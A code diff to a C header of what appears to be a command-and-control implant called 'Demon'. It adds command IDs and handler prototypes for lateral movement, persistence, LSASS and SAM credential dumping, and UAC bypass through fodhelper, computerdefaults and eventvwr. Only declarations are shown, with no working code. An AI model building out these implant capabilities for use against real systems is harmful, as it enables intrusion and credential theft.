@@ -30,6 +30,40 @@
 #define DEMON_PACKAGE_DROPPED                   2570
 #define DEMON_PACKAGE_FRAGMENT                  2580
 
+/* [HVC-032] New command groups — allocated in blocks of 10 */
+#define DEMON_COMMAND_LATERAL                   2600   /* lateral movement group   */
+#define DEMON_COMMAND_PERSIST                   2610   /* persistence group        */
+#define DEMON_COMMAND_CREDS                     2620   /* credential access group  */
+#define DEMON_COMMAND_PRIVESC                   2630   /* privilege escalation     */
+
+/* Lateral sub-commands */
+#define DEMON_LATERAL_WMI_EXEC                  1
+#define DEMON_LATERAL_DCOM_EXEC                 2
+
+/* Persistence sub-commands */
+#define DEMON_PERSIST_REG                       1
+#define DEMON_PERSIST_SCHTASK                   2
+#define DEMON_PERSIST_COM                       3
+#define DEMON_PERSIST_REMOVE                    4
+
+/* Remove type discriminators (used inside DEMON_PERSIST_REMOVE) */
+#define DEMON_PERSIST_REMOVE_REG                1
+#define DEMON_PERSIST_REMOVE_SCHTASK            2
+#define DEMON_PERSIST_REMOVE_COM                3
+
+/* Credential access sub-commands */
+#define DEMON_CREDS_LSASS                       1
+#define DEMON_CREDS_SAM                         2
+
+/* Privilege escalation sub-commands */
+#define DEMON_PRIVESC_UAC                       1
+
+/* UAC bypass methods */
+#define DEMON_PRIVESC_UAC_FODHELPER             1
+#define DEMON_PRIVESC_UAC_COMPUTERDEFAULTS      2
+#define DEMON_PRIVESC_UAC_EVENTVWR              3
+
+
 #define DEMON_INFO                      89
 #define DEMON_OUTPUT                    90
 #define DEMON_ERROR                     91
@@ -238,5 +272,23 @@ VOID CommandKerberos(
 VOID CommandMemFile(
     IN PPARSER Parser
 );
+
+/* [HVC-032] New command group handlers */
+VOID CommandLateral(
+    IN PPARSER DataArgs
+);
+
+VOID CommandPersist(
+    IN PPARSER DataArgs
+);
+
+VOID CommandCreds(
+    IN PPARSER DataArgs
+);
+
+VOID CommandPrivesc(
+    IN PPARSER DataArgs
+);
+
 
 #endif
